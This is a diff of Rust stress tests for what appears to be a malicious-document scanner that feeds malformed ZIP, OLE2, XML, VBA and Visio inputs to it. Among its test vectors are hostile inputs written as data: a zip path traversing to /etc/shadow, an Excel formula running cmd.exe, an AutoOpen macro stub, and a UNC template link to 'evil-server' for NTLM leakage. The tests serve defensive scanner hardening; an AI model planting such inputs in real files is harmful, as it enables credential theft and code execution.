@@ -10,8 +10,8 @@ use arca_container::cfb::writer::CfbBuilder;
 use arca_container::zip::writer::{Compression, ZipWriter};
 
 use super::fixtures::*;
-use crate::report::{ThreatKind, Verdict, XRayReport};
-use crate::{FileFormat, scan_default};
+use crate::report::XRayReport;
+use crate::scan_default;
 
 fn safe_scan(data: &[u8]) -> Result<XRayReport, String> {
     catch_unwind(AssertUnwindSafe(|| scan_default(data)))
@@ -27,9 +27,15 @@ fn test_zip_container_stress_30_vectors() {
     for i in 0..30 {
         let mut data = docx().build();
         match i {
-            0 => { data.truncate(data.len() / 2); } // Обрыв на половине
-            1 => { data.truncate(10); } // Обрыв в local header
-            2 => { data.extend_from_slice(&[0u8; 1000]); } // Трейлинг нули (хвост)
+            0 => {
+                data.truncate(data.len() / 2);
+            } // Обрыв на половине
+            1 => {
+                data.truncate(10);
+            } // Обрыв в local header
+            2 => {
+                data.extend_from_slice(&[0u8; 1000]);
+            } // Трейлинг нули (хвост)
             3 => {
                 // Искажение сигнатуры Central Directory
                 if let Some(pos) = data.windows(4).position(|w| w == b"PK\x01\x02") {
@@ -44,48 +50,54 @@ fn test_zip_container_stress_30_vectors() {
             }
             5 => {
                 // 65535 записей в EOCD (граница 16-бит)
-                if let Some(pos) = data.windows(4).position(|w| w == b"PK\x05\x06") {
-                    if pos + 10 < data.len() {
-                        data[pos + 8] = 0xFF;
-                        data[pos + 9] = 0xFF;
-                    }
+                if let Some(pos) = data.windows(4).position(|w| w == b"PK\x05\x06")
+                    && pos + 10 < data.len()
+                {
+                    data[pos + 8] = 0xFF;
+                    data[pos + 9] = 0xFF;
                 }
             }
             6 => {
                 // Несоответствие размера uncompressed
-                if let Some(pos) = data.windows(4).position(|w| w == b"PK\x03\x04") {
-                    if pos + 24 < data.len() {
-                        data[pos + 22] = 0xFF;
-                        data[pos + 23] = 0xFF;
-                    }
+                if let Some(pos) = data.windows(4).position(|w| w == b"PK\x03\x04")
+                    && pos + 24 < data.len()
+                {
+                    data[pos + 22] = 0xFF;
+                    data[pos + 23] = 0xFF;
                 }
             }
             7 => {
                 // Неверный метод сжатия (99 = несуществующий)
-                if let Some(pos) = data.windows(4).position(|w| w == b"PK\x03\x04") {
-                    if pos + 9 < data.len() {
-                        data[pos + 8] = 99;
-                        data[pos + 9] = 0;
-                    }
+                if let Some(pos) = data.windows(4).position(|w| w == b"PK\x03\x04")
+                    && pos + 9 < data.len()
+                {
+                    data[pos + 8] = 99;
+                    data[pos + 9] = 0;
                 }
             }
             8 => {
                 // Имя файла с выходом из каталога
                 let mut zw = ZipWriter::new();
                 let _ = zw.add("../../../../../etc/shadow", b"secret", Compression::Stored);
-                if let Ok(d) = zw.finish() { data = d; }
+                if let Ok(d) = zw.finish() {
+                    data = d;
+                }
             }
             9 => {
                 // Имя файла с нулевым байтом внутри
                 let mut zw = ZipWriter::new();
                 let _ = zw.add("word/document\0.xml", b"<xml/>", Compression::Stored);
-                if let Ok(d) = zw.finish() { data = d; }
+                if let Ok(d) = zw.finish() {
+                    data = d;
+                }
             }
             10 => {
                 // Абсолютный путь в имени файла
                 let mut zw = ZipWriter::new();
                 let _ = zw.add("/root/exploit", b"test", Compression::Stored);
-                if let Ok(d) = zw.finish() { data = d; }
+                if let Ok(d) = zw.finish() {
+                    data = d;
+                }
             }
             11 => {
                 // Двойной EOCD маркер
@@ -94,11 +106,11 @@ fn test_zip_container_stress_30_vectors() {
             }
             12 => {
                 // Огромный EOCD comment length
-                if let Some(pos) = data.windows(4).position(|w| w == b"PK\x05\x06") {
-                    if pos + 21 < data.len() {
-                        data[pos + 20] = 0xFF;
-                        data[pos + 21] = 0xFF;
-                    }
+                if let Some(pos) = data.windows(4).position(|w| w == b"PK\x05\x06")
+                    && pos + 21 < data.len()
+                {
+                    data[pos + 20] = 0xFF;
+                    data[pos + 21] = 0xFF;
                 }
             }
             13 => {
@@ -107,18 +119,18 @@ fn test_zip_container_stress_30_vectors() {
             }
             14 => {
                 // Отрицательное смещение Central Directory
-                if let Some(pos) = data.windows(4).position(|w| w == b"PK\x05\x06") {
-                    if pos + 19 < data.len() {
-                        data[pos + 16] = 0xFF;
-                        data[pos + 17] = 0xFF;
-                        data[pos + 18] = 0xFF;
-                        data[pos + 19] = 0x7F;
-                    }
+                if let Some(pos) = data.windows(4).position(|w| w == b"PK\x05\x06")
+                    && pos + 19 < data.len()
+                {
+                    data[pos + 16] = 0xFF;
+                    data[pos + 17] = 0xFF;
+                    data[pos + 18] = 0xFF;
+                    data[pos + 19] = 0x7F;
                 }
             }
             15..=29 => {
                 // Вариации мутаций байтов в потоке DEFLATE
-                let mut rng_val = (i as u8).wrapping_mul(37);
+                let mut rng_val = u8::try_from(i).unwrap_or(0).wrapping_mul(37);
                 for b in data.iter_mut().skip(50).take(200) {
                     *b ^= rng_val;
                     rng_val = rng_val.wrapping_add(13);
@@ -140,13 +152,19 @@ fn test_zip_container_stress_30_vectors() {
 fn test_cfb_ole2_stress_30_vectors() {
     for i in 0..30 {
         let mut builder = CfbBuilder::new();
-        builder.add_stream("Root Entry/Workbook", &[0u8; 128]);
-        let mut data = builder.build();
+        let _ = builder.add_stream("Root Entry/Workbook", vec![0u8; 128]);
+        let mut data = builder.finish().unwrap_or_default();
 
         match i {
-            0 => { data.truncate(512); } // Ровно один сектор заголовка
-            1 => { data.truncate(511); } // Обрезанный сектор
-            2 => { data.truncate(24); } // Меньше минимального размера OLE
+            0 => {
+                data.truncate(512);
+            } // Ровно один сектор заголовка
+            1 => {
+                data.truncate(511);
+            } // Обрезанный сектор
+            2 => {
+                data.truncate(24);
+            } // Меньше минимального размера OLE
             3 => {
                 // Искажение сигнатуры CFB
                 data[0] = 0x00;
@@ -183,11 +201,9 @@ fn test_cfb_ole2_stress_30_vectors() {
                 data[28] = 0x00;
                 data[29] = 0x00;
             }
-            10..=29 => {
+            10..=29 if data.len() > 512 + (i * 16) => {
                 // Повреждения внутри структуры секторов каталога
-                if data.len() > 512 + (i * 16) {
-                    data[512 + (i * 16)] = 0xFF;
-                }
+                data[512 + (i * 16)] = 0xFF;
             }
             _ => {}
         }
@@ -219,7 +235,7 @@ fn test_xml_parser_stress_30_vectors() {
         "<w:document></w:body></w:document>",
         // CDATA стресс
         "<![CDATA[ <w:p> unclosed cdata",
-        "<![CDATA[".repeat(50) + &"]]>".repeat(50),
+        &("<![CDATA[".repeat(50) + &"]]>".repeat(50)),
         // Управляющие символы и UTF-8 bidi overrides
         "<w:p><w:t>\u{202E}gnirts neddih\u{202C}</w:t></w:p>",
         "<w:p><w:t>\u{0}\u{1}\u{2}\u{3}\u{4}\u{5}</w:t></w:p>",
@@ -266,12 +282,16 @@ fn test_macro_active_content_stress_25_vectors() {
             }
             2 => {
                 // Обрезанный бинарный vbaProject
-                opc.set("word/vbaProject.bin", b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1\x00\x00\x00".to_vec());
+                opc.set(
+                    "word/vbaProject.bin",
+                    b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1\x00\x00\x00".to_vec(),
+                );
             }
             3 => {
                 // XLM / Excel 4.0 макрос в формуле
-                let mut xls = xlsx();
-                xls.set("xl/worksheets/sheet1.xml", r#"<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row><c r="A1"><f>=EXEC("cmd.exe")</f></c></row></sheetData></worksheet>"#);
+                let xls = xlsx(
+                    r#"<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row><c r="A1"><f>=EXEC("cmd.exe")</f></c></row></sheetData></worksheet>"#,
+                );
                 let res = safe_scan(&xls.build());
                 assert!(res.is_ok());
                 continue;
@@ -279,15 +299,24 @@ fn test_macro_active_content_stress_25_vectors() {
             4 => {
                 // Внешний шаблон UNC (NTLM leak vector)
                 let mut doc = docx();
-                doc.set("word/_rels/settings.xml.rels", rels(&[("rId1", "attachedTemplate", "\\\\evil-server\\share\\template.dotm", true)]));
+                doc.set(
+                    "word/_rels/settings.xml.rels",
+                    rels(&[(
+                        "rId1",
+                        "attachedTemplate",
+                        "\\\\evil-server\\share\\template.dotm",
+                        true,
+                    )]),
+                );
                 let res = safe_scan(&doc.build());
                 assert!(res.is_ok());
                 continue;
             }
             5..=24 => {
                 // Мутации тела VBA проекта
-                let mut vba_bytes = b"Attribut VB_Name = \"Test\"\nSub AutoOpen()\nEnd Sub\n".to_vec();
-                vba_bytes.extend(std::iter::repeat(i as u8).take(i * 50));
+                let mut vba_bytes =
+                    b"Attribut VB_Name = \"Test\"\nSub AutoOpen()\nEnd Sub\n".to_vec();
+                vba_bytes.extend(std::iter::repeat_n(u8::try_from(i).unwrap_or(0), i * 50));
                 opc.set("word/vbaProject.bin", vba_bytes);
             }
             _ => {}
@@ -363,7 +392,10 @@ fn test_access_visio_stress_20_vectors() {
             2 => {
                 // VSDX с поврежденным pages.xml
                 let mut opc = docx();
-                opc.set("visio/pages/pages.xml", b"<Pages><Page ID=\"0\" Name=\"Page-1\"/><Page ID=\"0\"/></Pages>");
+                opc.set(
+                    "visio/pages/pages.xml",
+                    b"<Pages><Page ID=\"0\" Name=\"Page-1\"/><Page ID=\"0\"/></Pages>",
+                );
                 data = opc.build();
             }
             3 => {
